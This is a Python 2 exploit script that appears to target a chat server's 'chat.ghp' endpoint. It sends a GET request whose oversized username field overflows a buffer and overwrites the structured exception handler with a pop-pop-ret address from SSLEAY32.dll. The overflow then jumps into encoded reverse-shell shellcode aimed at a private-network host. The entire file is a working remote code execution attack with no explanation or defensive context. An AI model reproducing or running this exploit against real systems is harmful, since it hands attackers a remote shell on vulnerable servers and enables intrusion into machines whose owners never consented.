#!/usr/bin/python

import socket
import os
import sys
import struct

ip = "192.168.100.120"
port = 80

revshell =  b""
revshell += b"\xba\x9a\x97\x43\xbe\xd9\xee\xd9\x74\x24\xf4\x5d"
revshell += b"\x33\xc9\xb1\x52\x83\xc5\x04\x31\x55\x0e\x03\xcf"
revshell += b"\x99\xa1\x4b\x13\x4d\xa7\xb4\xeb\x8e\xc8\x3d\x0e"
revshell += b"\xbf\xc8\x5a\x5b\x90\xf8\x29\x09\x1d\x72\x7f\xb9"
revshell += b"\x96\xf6\xa8\xce\x1f\xbc\x8e\xe1\xa0\xed\xf3\x60"
revshell += b"\x23\xec\x27\x42\x1a\x3f\x3a\x83\x5b\x22\xb7\xd1"
revshell += b"\x34\x28\x6a\xc5\x31\x64\xb7\x6e\x09\x68\xbf\x93"
revshell += b"\xda\x8b\xee\x02\x50\xd2\x30\xa5\xb5\x6e\x79\xbd"
revshell += b"\xda\x4b\x33\x36\x28\x27\xc2\x9e\x60\xc8\x69\xdf"
revshell += b"\x4c\x3b\x73\x18\x6a\xa4\x06\x50\x88\x59\x11\xa7"
revshell += b"\xf2\x85\x94\x33\x54\x4d\x0e\x9f\x64\x82\xc9\x54"
revshell += b"\x6a\x6f\x9d\x32\x6f\x6e\x72\x49\x8b\xfb\x75\x9d"
revshell += b"\x1d\xbf\x51\x39\x45\x1b\xfb\x18\x23\xca\x04\x7a"
revshell += b"\x8c\xb3\xa0\xf1\x21\xa7\xd8\x58\x2e\x04\xd1\x62"
revshell += b"\xae\x02\x62\x11\x9c\x8d\xd8\xbd\xac\x46\xc7\x3a"
revshell += b"\xd2\x7c\xbf\xd4\x2d\x7f\xc0\xfd\xe9\x2b\x90\x95"
revshell += b"\xd8\x53\x7b\x65\xe4\x81\x2c\x35\x4a\x7a\x8d\xe5"
revshell += b"\x2a\x2a\x65\xef\xa4\x15\x95\x10\x6f\x3e\x3c\xeb"
revshell += b"\xf8\x81\x69\x97\x8d\x69\x68\x57\x7f\x36\xe5\xb1"
revshell += b"\x15\xd6\xa3\x6a\x82\x4f\xee\xe0\x33\x8f\x24\x8d"
revshell += b"\x74\x1b\xcb\x72\x3a\xec\xa6\x60\xab\x1c\xfd\xda"
revshell += b"\x7a\x22\x2b\x72\xe0\xb1\xb0\x82\x6f\xaa\x6e\xd5"
revshell += b"\x38\x1c\x67\xb3\xd4\x07\xd1\xa1\x24\xd1\x1a\x61"
revshell += b"\xf3\x22\xa4\x68\x76\x1e\x82\x7a\x4e\x9f\x8e\x2e"
revshell += b"\x1e\xf6\x58\x98\xd8\xa0\x2a\x72\xb3\x1f\xe5\x12"
revshell += b"\x42\x6c\x36\x64\x4b\xb9\xc0\x88\xfa\x14\x95\xb7"
revshell += b"\x33\xf1\x11\xc0\x29\x61\xdd\x1b\xea\x81\x3c\x89"
revshell += b"\x07\x2a\x99\x58\xaa\x37\x1a\xb7\xe9\x41\x99\x3d"
revshell += b"\x92\xb5\x81\x34\x97\xf2\x05\xa5\xe5\x6b\xe0\xc9"
revshell += b"\x5a\x8b\x21"

nSEH = "\xEB\x09\x90\x90"            # Jump to D buffer
SEH  = struct.pack("<I", 0x10017f64) # ppr - SSLEAY32.dll

crash  = "A" * 217
crash += nSEH
crash += SEH
crash += "\x90" * 30
crash += revshell
crash += "D" * (10487 - len(crash))

req  = "GET /chat.ghp?username=" + crash + "&password=skew&room=2&sex=2 HTTP/1.1\r\n"
req += "Host: 192.168.100.120\r\n"
req += "User-Agent: Mozilla/5.0 \r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Referer: http://192.168.100.120/\r\n"
req += "Connection: close\r\n"
req += "Cookie: UserID=; PassWD=; frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n\r\n\r\n"

print "[*] Sending evil http request to target"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(req)
expl.close()
